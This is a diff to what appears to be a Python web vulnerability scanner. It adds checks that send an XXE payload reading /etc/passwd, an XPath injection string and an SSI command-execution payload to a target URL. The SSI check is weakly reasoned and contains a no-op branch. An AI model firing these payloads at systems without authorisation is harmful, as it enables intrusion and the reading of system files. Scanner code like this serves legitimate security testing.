@@ -206,3 +206,58 @@ def check_api_docs(url: str) -> Dict[str, Any]:
     if found:
         return {"status": "found", "docs": found}
     return {"status": "not_found", "message": "No API docs found"}
+
+def test_xxe_injection(url: str, param: str) -> Dict[str, Any]:
+    """
+    Simulates XXE injection attempt.
+    """
+    payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
+    <!DOCTYPE foo [
+    <!ELEMENT foo ANY >
+    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>"""
+
+    try:
+        # Assuming we POST XML data
+        res = requests.post(url, data=payload, headers={'Content-Type': 'application/xml'}, timeout=5)
+        if "root:x:0:0" in res.text:
+             return {"status": "vulnerable", "message": "XXE payload reflected /etc/passwd content"}
+        return {"status": "safe", "message": "No obvious XXE reflection"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+def test_xpath_injection(url: str, param: str) -> Dict[str, Any]:
+    """
+    Checks for XPath Injection errors.
+    """
+    payload = "' or '1'='1"
+    try:
+        target = f"{url}?{param}={payload}" if '?' not in url else f"{url}&{param}={payload}"
+        res = requests.get(target, timeout=5)
+
+        errors = ["XPathException", "System.Xml.XPath", "SimpleXMLElement"]
+        for err in errors:
+            if err in res.text:
+                 return {"status": "vulnerable", "message": f"XPath error detected: {err}"}
+        return {"status": "safe", "message": "No XPath errors detected"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
+
+def test_ssi_injection(url: str, param: str) -> Dict[str, Any]:
+    """
+    Checks for Server Side Include (SSI) injection.
+    """
+    payload = "<!--#exec cmd=\"ls\" -->"
+    try:
+        target = f"{url}?{param}={payload}" if '?' not in url else f"{url}&{param}={payload}"
+        res = requests.get(target, timeout=5)
+
+        # Look for file listing or common output
+        if "index.php" in res.text or "bin" in res.text: # very generic
+             # Better check if we see our payload reflected but processed
+             pass
+
+        if payload in res.text:
+             return {"status": "safe", "message": "Payload reflected but likely not executed"}
+        return {"status": "info", "message": "Manual verification required for SSI execution"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}
